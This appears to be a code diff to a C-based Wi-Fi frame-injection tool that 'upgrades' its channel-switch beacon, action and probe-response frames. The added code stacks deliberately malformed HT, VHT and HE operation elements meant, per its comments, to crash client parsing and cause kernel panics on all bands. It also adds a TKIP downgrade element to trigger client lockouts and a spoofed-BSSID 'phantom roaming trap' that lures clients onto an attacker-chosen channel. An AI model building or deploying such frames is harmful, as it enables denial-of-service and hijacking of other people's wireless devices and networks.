@@ -683,16 +683,50 @@ static int mk_csa_beacon(uint8_t *b, const uint8_t bss[6], const char *ssid,
   memcpy(b + o, &qdur, 2); o += 2;
   uint16_t qoff = htole16(0);
   memcpy(b + o, &qoff, 2); o += 2;
-  /* [UPGRADE] IE 192 (VHT Operation) Malformation - 160MHz Kernel Panic for 5GHz */
-  if (new_ch > 14) {
-      b[o++] = 192;
-      b[o++] = 5;
-      b[o++] = 2;   /* Channel Width: 160 MHz */
-      b[o++] = 255; /* Center Freq 1: Out of Bounds */
-      b[o++] = 255; /* Center Freq 2: Out of Bounds */
-      b[o++] = 0xff; /* Basic MCS Set */
-      b[o++] = 0xff;
-  }
+  /* =========================================================================
+   * [UPGRADE] OMNI-PANIC PROTOCOL MALFORMATION (IE Stacking)
+   * Applied to ALL bands (2.4GHz & 5GHz) to crash parsing logic universally
+   * ========================================================================= */
+
+  /* 1. IE 61 (HT Operation - Wi-Fi 4): Invalid Secondary Channel Offset */
+  b[o++] = 61;
+  b[o++] = 22;
+  b[o++] = cur_ch;
+  b[o++] = 0x03; /* reserved/invalid secondary channel offset -> integer overflow */
+  for (int i = 0; i < 20; i++) b[o++] = 0x00; /* pad rest of HT operation */
+
+  /* 2. IE 192 (VHT Operation - Wi-Fi 5): 160MHz out-of-bounds */
+  b[o++] = 192;
+  b[o++] = 5;
+  b[o++] = 2;   /* Channel Width: 160 MHz */
+  b[o++] = 255; /* Center Freq 1: Out of Bounds */
+  b[o++] = 255; /* Center Freq 2: Out of Bounds */
+  b[o++] = 0xff; /* Basic MCS Set */
+  b[o++] = 0xff;
+
+  /* 3. IE 255 Ext 36 (HE Operation - Wi-Fi 6): BSS Color collision/corruption */
+  b[o++] = 255; /* Element ID Extension */
+  b[o++] = 6;
+  b[o++] = 36;  /* Ext ID: HE Operation */
+  b[o++] = 0x00; /* HE MAC Parameters */
+  b[o++] = 0x00;
+  b[o++] = 0x00;
+  b[o++] = 0x3f; /* Max BSS Color + Partial BSS Color flag (malformed) */
+  b[o++] = 0x00;
+
+  /* =========================================================================
+   * [UPGRADE] RSN Downgrade Poisoning (WPA3 Self-Banishment)
+   * Advertises WPA-TKIP to trigger client-side KRACK protection lockouts
+   * ========================================================================= */
+  b[o++] = 48; /* RSN IE */
+  b[o++] = 20;
+  b[o++] = 0x01; b[o++] = 0x00; /* Version 1 */
+  b[o++] = 0x00; b[o++] = 0x0f; b[o++] = 0xac; b[o++] = 0x02; /* Group Cipher: TKIP (02) - Highly deprecated */
+  b[o++] = 0x01; b[o++] = 0x00; /* Pairwise Cipher Count: 1 */
+  b[o++] = 0x00; b[o++] = 0x0f; b[o++] = 0xac; b[o++] = 0x02; /* Pairwise Cipher: TKIP (02) */
+  b[o++] = 0x01; b[o++] = 0x00; /* AKM Count: 1 */
+  b[o++] = 0x00; b[o++] = 0x0f; b[o++] = 0xac; b[o++] = 0x02; /* AKM: PSK (02) */
+  b[o++] = 0x00; b[o++] = 0x00; /* RSN Capabilities */
 
   return o;
 }
@@ -854,16 +888,36 @@ static int mk_csa_action(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
   memcpy(b + o, &qdur, 2); o += 2;
   uint16_t qoff = htole16(0);
   memcpy(b + o, &qoff, 2); o += 2;
-  /* [UPGRADE] IE 192 (VHT Operation) Malformation - 160MHz Kernel Panic for 5GHz */
-  if (new_ch > 14) {
-      b[o++] = 192;
-      b[o++] = 5;
-      b[o++] = 2;   /* Channel Width: 160 MHz */
-      b[o++] = 255; /* Center Freq 1: Out of Bounds */
-      b[o++] = 255; /* Center Freq 2: Out of Bounds */
-      b[o++] = 0xff; /* Basic MCS Set */
-      b[o++] = 0xff;
-  }
+  /* =========================================================================
+   * [UPGRADE] OMNI-PANIC PROTOCOL MALFORMATION (IE Stacking)
+   * Applied to ALL bands (2.4GHz & 5GHz) to crash parsing logic universally
+   * ========================================================================= */
+
+  /* 1. IE 61 (HT Operation - Wi-Fi 4): Invalid Secondary Channel Offset */
+  b[o++] = 61;
+  b[o++] = 22;
+  b[o++] = new_ch; /* For Action frame, we use the destination channel */
+  b[o++] = 0x03; /* reserved/invalid secondary channel offset -> integer overflow */
+  for (int i = 0; i < 20; i++) b[o++] = 0x00; /* pad rest of HT operation */
+
+  /* 2. IE 192 (VHT Operation - Wi-Fi 5): 160MHz out-of-bounds */
+  b[o++] = 192;
+  b[o++] = 5;
+  b[o++] = 2;   /* Channel Width: 160 MHz */
+  b[o++] = 255; /* Center Freq 1: Out of Bounds */
+  b[o++] = 255; /* Center Freq 2: Out of Bounds */
+  b[o++] = 0xff; /* Basic MCS Set */
+  b[o++] = 0xff;
+
+  /* 3. IE 255 Ext 36 (HE Operation - Wi-Fi 6): BSS Color collision/corruption */
+  b[o++] = 255; /* Element ID Extension */
+  b[o++] = 6;
+  b[o++] = 36;  /* Ext ID: HE Operation */
+  b[o++] = 0x00; /* HE MAC Parameters */
+  b[o++] = 0x00;
+  b[o++] = 0x00;
+  b[o++] = 0x3f; /* Max BSS Color + Partial BSS Color flag (malformed) */
+  b[o++] = 0x00;
 
   return o;
 }
@@ -918,16 +972,50 @@ static int mk_probe_resp_csa(uint8_t *b, const uint8_t bss[6],
   memcpy(b + o, &qdur, 2); o += 2;
   uint16_t qoff = htole16(0);
   memcpy(b + o, &qoff, 2); o += 2;
-  /* [UPGRADE] IE 192 (VHT Operation) Malformation - 160MHz Kernel Panic for 5GHz */
-  if (new_ch > 14) {
-      b[o++] = 192;
-      b[o++] = 5;
-      b[o++] = 2;   /* Channel Width: 160 MHz */
-      b[o++] = 255; /* Center Freq 1: Out of Bounds */
-      b[o++] = 255; /* Center Freq 2: Out of Bounds */
-      b[o++] = 0xff; /* Basic MCS Set */
-      b[o++] = 0xff;
-  }
+  /* =========================================================================
+   * [UPGRADE] OMNI-PANIC PROTOCOL MALFORMATION (IE Stacking)
+   * Applied to ALL bands (2.4GHz & 5GHz) to crash parsing logic universally
+   * ========================================================================= */
+
+  /* 1. IE 61 (HT Operation - Wi-Fi 4): Invalid Secondary Channel Offset */
+  b[o++] = 61;
+  b[o++] = 22;
+  b[o++] = cur_ch;
+  b[o++] = 0x03; /* reserved/invalid secondary channel offset -> integer overflow */
+  for (int i = 0; i < 20; i++) b[o++] = 0x00; /* pad rest of HT operation */
+
+  /* 2. IE 192 (VHT Operation - Wi-Fi 5): 160MHz out-of-bounds */
+  b[o++] = 192;
+  b[o++] = 5;
+  b[o++] = 2;   /* Channel Width: 160 MHz */
+  b[o++] = 255; /* Center Freq 1: Out of Bounds */
+  b[o++] = 255; /* Center Freq 2: Out of Bounds */
+  b[o++] = 0xff; /* Basic MCS Set */
+  b[o++] = 0xff;
+
+  /* 3. IE 255 Ext 36 (HE Operation - Wi-Fi 6): BSS Color collision/corruption */
+  b[o++] = 255; /* Element ID Extension */
+  b[o++] = 6;
+  b[o++] = 36;  /* Ext ID: HE Operation */
+  b[o++] = 0x00; /* HE MAC Parameters */
+  b[o++] = 0x00;
+  b[o++] = 0x00;
+  b[o++] = 0x3f; /* Max BSS Color + Partial BSS Color flag (malformed) */
+  b[o++] = 0x00;
+
+  /* =========================================================================
+   * [UPGRADE] RSN Downgrade Poisoning (WPA3 Self-Banishment)
+   * Advertises WPA-TKIP to trigger client-side KRACK protection lockouts
+   * ========================================================================= */
+  b[o++] = 48; /* RSN IE */
+  b[o++] = 20;
+  b[o++] = 0x01; b[o++] = 0x00; /* Version 1 */
+  b[o++] = 0x00; b[o++] = 0x0f; b[o++] = 0xac; b[o++] = 0x02; /* Group Cipher: TKIP (02) - Highly deprecated */
+  b[o++] = 0x01; b[o++] = 0x00; /* Pairwise Cipher Count: 1 */
+  b[o++] = 0x00; b[o++] = 0x0f; b[o++] = 0xac; b[o++] = 0x02; /* Pairwise Cipher: TKIP (02) */
+  b[o++] = 0x01; b[o++] = 0x00; /* AKM Count: 1 */
+  b[o++] = 0x00; b[o++] = 0x0f; b[o++] = 0xac; b[o++] = 0x02; /* AKM: PSK (02) */
+  b[o++] = 0x00; b[o++] = 0x00; /* RSN Capabilities */
 
   return o;
 }
@@ -4237,6 +4325,17 @@ static void *stress_injector_thread(void *arg) {
            * Clients searching for the SSID will process the CSA regardless of the
            * AP's real MAC. */
           len = mk_probe_resp_csa(tmp, BCAST, BCAST, ssid,
+                                  (uint8_t)snap[i].channel, (uint8_t)redir, (uint8_t)c);
+          if (inject_one(sock, tmp, len) > 0) {
+            atomic_fetch_add(&g_pkts_sent, 1);
+            sent_for_ap++;
+          }
+          /* 3. [UPGRADE] Phantom Roaming Trap (Spoofed BSSID)
+           * Creates a fake AP with the same SSID but different MAC.
+           * When clients attempt to roam to it, it forces them into the trap channel. */
+          uint8_t phantom_bss[6];
+          rand_mac(phantom_bss);
+          len = mk_probe_resp_csa(tmp, phantom_bss, BCAST, ssid,
                                   (uint8_t)snap[i].channel, (uint8_t)redir, (uint8_t)c);
           if (inject_one(sock, tmp, len) > 0) {
             atomic_fetch_add(&g_pkts_sent, 1);
